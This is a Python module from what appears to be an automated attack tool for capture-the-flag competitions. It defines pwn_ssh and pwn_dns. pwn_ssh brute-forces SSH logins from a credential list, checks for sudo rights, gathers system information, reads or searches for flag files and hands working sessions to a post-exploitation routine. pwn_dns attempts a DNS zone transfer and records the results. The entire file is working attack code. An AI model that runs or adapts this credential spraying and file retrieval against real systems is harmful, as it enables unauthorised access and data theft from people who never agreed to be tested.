import logging
import os
from typing import Tuple

import paramiko
import dns.query
import dns.zone
from dns.exception import DNSException

from .exploit import find_flags, FlagConf, can_sudo, get_file_contents, get_system_info, LimitCreds
from .governor import Governor
from .models import Service, Credential, Flag, CaptureNote, DNSResult
from .post import post_ssh
from .utils import limited_credentials

logger = logging.getLogger(__name__)


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
            limit_creds: LimitCreds) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()
    base_dir = flag_conf['location'] if flag_conf else None
    enable_search = flag_conf['search'] if flag_conf else True

    working = set()
    credentials = limited_credentials(limit_creds)
    for credential in credentials:
        # Govern if necessary (and enabled)
        gov = Governor.get_instance()
        gov.attempt(gov.resolve_url(url))

        try:
            cred = credential.credentials.where(Credential.service == service).get()
        except Credential.DoesNotExist:
            cred = Credential.create(service=service, state=Credential.REJECT, bag=credential)

        try:
            with ssh:
                logger.debug("Attempting {} with creds: {}".format(url, cred))
                ssh.connect(url, port=port, username=credential.username, password=credential.password,
                            look_for_keys=False, allow_agent=False)
                cred.state = Credential.WORKS

                # Root doesn't need sudo
                sudo = False
                if credential.username != "root":
                    sudo = can_sudo(ssh, credential.password)
                    if sudo:
                        cred.sudo = True

                cred.save()
                working.add(cred)

                sysinfo = get_system_info(ssh)
                if sudo:
                    sysinfo += "\nUsed Sudo"

                flag_obj, _ = Flag.get_or_create(team=service.team, name=flag_conf['name'])

                if flag_conf:
                    location = flag_conf['name']
                    full_location = os.path.join(base_dir, location)
                    sudo_cred = credential.password if sudo else None
                    flag = get_file_contents(ssh, full_location, sudo=sudo_cred)
                    if flag:
                        enable_search = False
                        note, created = CaptureNote.get_or_create(flag=flag_obj, data=flag, location=full_location,
                                                                  notes=str(sysinfo), service=service)

                if enable_search:
                    flags = find_flags(ssh, base_dir=base_dir)
                    for flag in flags:
                        CaptureNote.get_or_create(flag=flag_obj, data=flag[1], location=flag[0], notes=str(sysinfo),
                                                  searched=True, service=service)

                if cred.state == Credential.WORKS:
                    post_ssh(ssh, cred)
        except paramiko.ssh_exception.AuthenticationException:
            continue
        except Exception:
            logger.exception("There was an error pwning this service: %s", url)

    if working:
        return "Found credentials: {}".format(working), True, False
    else:
        return 'Authentication failed', False, False


def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
            limit_creds: LimitCreds) -> Tuple[str, bool, bool]:
    try:
        z = dns.zone.from_xfr(dns.query.xfr(url, service.team.domain))
        names = z.nodes.keys()
        for name in names:
            record = z[name]
            DNSResult.get_or_create(team=service.team, name=name.to_text(), record=record.to_text())
    except DNSException:
        return 'Unable to AXFR', False, False
    except:
        return 'Unable to connect', False, False
    else:
        return 'Got zone {} from AXFR'.format(service.team.domain), True, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
    'dns': pwn_dns,
}
